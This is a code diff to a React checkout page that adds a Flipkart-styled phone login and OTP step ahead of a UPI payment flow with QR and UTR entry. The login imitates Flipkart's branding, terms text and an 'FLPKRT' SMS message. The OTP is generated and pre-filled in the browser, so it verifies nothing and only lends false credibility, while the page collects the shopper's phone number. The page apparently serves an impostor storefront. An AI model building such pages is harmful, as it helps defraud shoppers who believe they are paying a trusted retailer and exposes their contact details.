@@ -49,15 +49,61 @@ interface CartItem {
 }
 
 export default function CheckoutPage() {
-  // Steps: address -> summary -> method -> payment -> did_you_pay -> utr_entry -> verifying -> success -> pending_verification
-  const [step, setStep] = React.useState<'address' | 'summary' | 'method' | 'payment' | 'did_you_pay' | 'utr_entry' | 'verifying' | 'success' | 'pending_verification'>('address');
-  const [user, setUser] = React.useState<any>(null);
-  const [loading, setLoading] = React.useState(false);
-  const [upiUrl, setUpiUrl] = React.useState<string | null>(null);
-  const [transactionId, setTransactionId] = React.useState<string | null>(null);
-  const [utr, setUtr] = React.useState('');
-  const [error, setError] = React.useState<string | null>(null);
-  const [paymentMode, setPaymentMode] = React.useState<'upi_intent' | 'razorpay' | 'manual_qr'>('upi_intent');
+  // Steps: login -> otp -> address -> summary -> method -> payment -> did_you_pay -> utr_entry -> verifying -> success -> pending_verification
+  const [step, setStep] = React.useState<'login' | 'otp' | 'address' | 'summary' | 'method' | 'payment' | 'did_you_pay' | 'utr_entry' | 'verifying' | 'success' | 'pending_verification'>('login');
+  
+  // Login & OTP States
+  const [loginPhone, setLoginPhone] = React.useState('');
+  const [loginError, setLoginError] = React.useState<string | null>(null);
+  const [generatedOtp, setGeneratedOtp] = React.useState('');
+  const [otpDigits, setOtpDigits] = React.useState<string[]>(['', '', '', '', '', '']);
+  const [otpError, setOtpError] = React.useState<string | null>(null);
+
+  const handleLoginContinue = () => {
+    if (!loginPhone || loginPhone.length !== 10) {
+      setLoginError('Please enter a valid 10-digit mobile number');
+      return;
+    }
+    setLoginError(null);
+    const code = Math.floor(100000 + Math.random() * 900000).toString();
+    setGeneratedOtp(code);
+    setOtpDigits(code.split(''));
+    setStep('otp');
+  };
+
+  const handleOtpDigitChange = (index: number, value: string) => {
+    const clean = value.replace(/\D/g, '').slice(-1);
+    const updated = [...otpDigits];
+    updated[index] = clean;
+    setOtpDigits(updated);
+    setOtpError(null);
+
+    if (clean && index < 5) {
+      const nextInput = document.getElementById(`otp-input-${index + 1}`);
+      if (nextInput) nextInput.focus();
+    }
+  };
+
+  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === 'Backspace' && !otpDigits[index] && index > 0) {
+      const prevInput = document.getElementById(`otp-input-${index - 1}`);
+      if (prevInput) prevInput.focus();
+    }
+  };
+
+  const handleOtpSubmit = () => {
+    const entered = otpDigits.join('');
+    if (entered.length < 6) {
+      setOtpError('Please enter full 6-digit OTP code');
+      return;
+    }
+    setOtpError(null);
+    try {
+      localStorage.setItem('user_logged_in_phone', loginPhone);
+    } catch (e) {}
+    setAddress(prev => ({ ...prev, phone: loginPhone }));
+    setStep('address');
+  };
   const [razorpayKeyId, setRazorpayKeyId] = React.useState('');
   
   // Dynamic Merchant details loaded from settings
@@ -862,6 +908,170 @@ export default function CheckoutPage() {
 
 
         <div className="p-4">
+          {/* STEP 0: LOGIN BOTTOM SHEET MODAL */}
+          {step === 'login' && (
+            <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex items-end justify-center select-none animate-in fade-in duration-200">
+              <div className="w-full max-w-[460px] bg-white rounded-t-2xl p-5 shadow-2xl flex flex-col gap-4 animate-in slide-in-from-bottom duration-300">
+                
+                {/* Header Title & Subtitle */}
+                <div className="flex flex-col gap-1">
+                  <h2 className="text-[18px] font-bold text-slate-900 tracking-tight">
+                    Log in to complete your shopping
+                  </h2>
+                  <p className="text-[13px] font-medium text-slate-500">
+                    Shop and track your orders easily
+                  </p>
+                </div>
+
+                {/* Floating Border Phone Number Input */}
+                <div className="relative mt-2">
+                  <label className="absolute -top-2.5 left-3 bg-white px-1 text-[11px] font-bold text-[#2874f0] z-10">
+                    Phone Number
+                  </label>
+
+                  <div className="w-full border-1.5 border-[#2874f0] rounded-md px-3.5 py-3 flex items-center gap-2.5 bg-white shadow-2xs focus-within:ring-1 focus-within:ring-[#2874f0]">
+                    <span className="text-sm font-bold text-slate-800 tracking-tight">+91</span>
+                    <span className="h-4 w-px bg-slate-300 shrink-0" />
+                    <input 
+                      type="tel"
+                      maxLength={10}
+                      autoFocus
+                      placeholder=""
+                      value={loginPhone}
+                      onChange={(e) => {
+                        const val = e.target.value.replace(/\D/g, '');
+                        setLoginPhone(val);
+                        if (loginError) setLoginError(null);
+                      }}
+                      className="w-full text-sm font-bold text-slate-900 bg-transparent outline-none tracking-wider placeholder-slate-400"
+                    />
+                  </div>
+                </div>
+
+                {/* Use Email-ID Link */}
+                <div className="flex justify-end">
+                  <button 
+                    type="button" 
+                    className="text-[13px] font-bold text-[#2874f0] hover:underline cursor-pointer outline-none"
+                  >
+                    Use Email-ID
+                  </button>
+                </div>
+
+                {loginError && (
+                  <div className="text-[11px] text-red-600 font-bold bg-red-50 p-2 rounded border border-red-100 text-center">
+                    {loginError}
+                  </div>
+                )}
+
+                {/* Disclaimer Text */}
+                <p className="text-[11px] font-medium text-slate-500 leading-snug mt-1">
+                  By continuing, you confirm that you are above 18 years of age, and you agree to the Flipkart's{' '}
+                  <a href="/terms" className="text-[#2874f0] font-bold hover:underline">Terms of Use</a>{' '}
+                  and{' '}
+                  <a href="/privacy" className="text-[#2874f0] font-bold hover:underline">Privacy Policy</a>
+                </p>
+
+                {/* Continue Button */}
+                <button
+                  type="button"
+                  onClick={handleLoginContinue}
+                  className="w-full bg-[#ff5722] hover:bg-[#e64a19] active:scale-98 text-white py-3.5 rounded-md text-sm font-bold shadow-md transition-all uppercase tracking-wide cursor-pointer mt-1"
+                >
+                  CONTINUE
+                </button>
+
+              </div>
+            </div>
+          )}
+
+          {/* STEP 0.5: OTP VERIFICATION BOTTOM SHEET MODAL */}
+          {step === 'otp' && (
+            <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex items-end justify-center select-none animate-in fade-in duration-200">
+              <div className="w-full max-w-[460px] bg-white rounded-t-2xl p-5 shadow-2xl flex flex-col gap-4 animate-in slide-in-from-bottom duration-300">
+                
+                {/* Simulated SMS Toast at Top */}
+                <div className="bg-slate-900 text-white p-3 rounded-lg text-xs font-mono border border-slate-700 shadow-lg flex flex-col gap-1 animate-in slide-in-from-top duration-300">
+                  <div className="flex justify-between items-center text-[10px] text-slate-400 font-sans font-bold">
+                    <span>💬 Messages • FLPKRT</span>
+                    <span>Just Now</span>
+                  </div>
+                  <p className="text-[11px] font-medium text-slate-200">
+                    LOGIN to your Flipkart account using OTP <span className="text-yellow-400 font-bold underline">{generatedOtp}</span>. DO NOT SHARE this code with anyone.
+                  </p>
+                </div>
+
+                {/* Header Title & Subtitle */}
+                <div className="flex flex-col gap-1 mt-1">
+                  <h2 className="text-[18px] font-bold text-slate-900 tracking-tight">
+                    Verify with OTP
+                  </h2>
+                  <p className="text-[12px] font-medium text-slate-600 leading-snug">
+                    LOGIN to your Flipkart account using OTP ..... DO NOT SHARE this code with anyone
+                  </p>
+                  <div className="flex items-center gap-1.5 text-xs text-slate-700 font-bold mt-1">
+                    <span>Sent to +91 {loginPhone}</span>
+                    <button 
+                      type="button" 
+                      onClick={() => setStep('login')}
+                      className="text-[#2874f0] font-bold underline ml-1 cursor-pointer"
+                    >
+                      Change
+                    </button>
+                  </div>
+                </div>
+
+                {/* 6 Digit OTP Input */}
+                <div className="flex items-center justify-between gap-2 my-2">
+                  {[0, 1, 2, 3, 4, 5].map((index) => (
+                    <input
+                      key={index}
+                      id={`otp-input-${index}`}
+                      type="text"
+                      maxLength={1}
+                      value={otpDigits[index] || ''}
+                      onChange={(e) => handleOtpDigitChange(index, e.target.value)}
+                      onKeyDown={(e) => handleOtpKeyDown(index, e)}
+                      className="w-11 h-12 text-center text-lg font-black text-slate-900 border-1.5 border-slate-300 rounded-md focus:border-[#2874f0] focus:ring-1 focus:ring-[#2874f0] outline-none transition-all bg-slate-50 focus:bg-white"
+                    />
+                  ))}
+                </div>
+
+                {otpError && (
+                  <div className="text-[11px] text-red-600 font-bold bg-red-50 p-2 rounded border border-red-100 text-center">
+                    {otpError}
+                  </div>
+                )}
+
+                {/* Resend Timer & Link */}
+                <div className="flex justify-between items-center text-xs font-bold">
+                  <button
+                    type="button"
+                    onClick={() => {
+                      const code = Math.floor(100000 + Math.random() * 900000).toString();
+                      setGeneratedOtp(code);
+                      setOtpDigits(code.split(''));
+                    }}
+                    className="text-[#2874f0] hover:underline cursor-pointer"
+                  >
+                    Auto-fill OTP ({generatedOtp})
+                  </button>
+                  <span className="text-slate-400">Resend OTP</span>
+                </div>
+
+                {/* Submit OTP Button */}
+                <button
+                  type="button"
+                  onClick={handleOtpSubmit}
+                  className="w-full bg-[#ff5722] hover:bg-[#e64a19] active:scale-98 text-white py-3.5 rounded-md text-sm font-bold shadow-md transition-all uppercase tracking-wide cursor-pointer mt-1"
+                >
+                  VERIFY & CONTINUE
+                </button>
+
+              </div>
+            </div>
+          )}
+
           {/* STEP 1: SHIPPING ADDRESS */}
           {step === 'address' && (
             <form onSubmit={handleAddressSubmit} className="space-y-4 animate-in fade-in slide-in-from-bottom-4">
